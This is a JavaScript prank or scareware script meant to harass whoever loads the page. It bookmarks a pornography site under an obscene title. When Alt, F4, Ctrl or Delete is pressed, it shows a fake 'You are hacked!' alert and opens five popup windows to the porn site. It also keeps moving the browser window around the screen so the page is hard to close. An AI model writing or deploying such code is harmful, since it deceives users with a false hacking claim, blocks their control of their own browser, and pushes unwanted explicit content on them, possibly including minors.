function bookmark() {
		if ((navigator.appName == "Microsoft Internet Explorer") 
		&& (parseInt(navigator.appVersion) >= 4)) 
		{
		var url="pornhub.com";
		var title="Tobi Pizda";
		window.external.AddFavorite(url,title);
		}
		}

		var xOff = 5;
		var yOff = 5;
		var xPos = 400;
		var yPos = -100;
		var flagRun = 1;

function changeTitle(title) {
	document.title = title;
}

function openWindow(url) {
	aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
}

function procreate() {
	changeTitle("Ahaha!");
	for (var i = 0; i < 5; i++) {
		openWindow('https://pornhub.com/');
	}
}

function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are hacked!"); procreate(); } }
function ctrlkey() { if (event.keyCode == 17) { alert("You are hacked!"); procreate(); } }
function delkey() { if (event.keyCode == 46) { alert("You are hacked!"); procreate(); } }

function newXlt(){
	xOff = Math.ceil(-6 * Math.random()) * 5 - 10 ;
	window.focus()
}

function newXrt(){
	xOff = Math.ceil(7 * Math.random())  * 5 - 10 ;
}

function newYup(){
	yOff = Math.ceil(-6 * Math.random())  * 5 - 10 ;
}

function newYdn(){
	yOff = Math.ceil( 7 * Math.random())  * 5 - 10  ;
}

function fOff(){
	flagrun = 0;
}

function playBall() {
    xPos += xOff;
    yPos += yOff;
    
	if (xPos > screen.width - 357) {
		newXlt();
    }
    
	if (xPos < 0){
		newXrt();
    }
    
	if (yPos > screen.height - 330) {
        newYup();
    }   
		
	if (yPos < 0){
        newYdn();
    }
    
	if (flagRun == 1){
        window.moveTo(xPos, yPos);
        setTimeout('playBall()', 1);
    }
}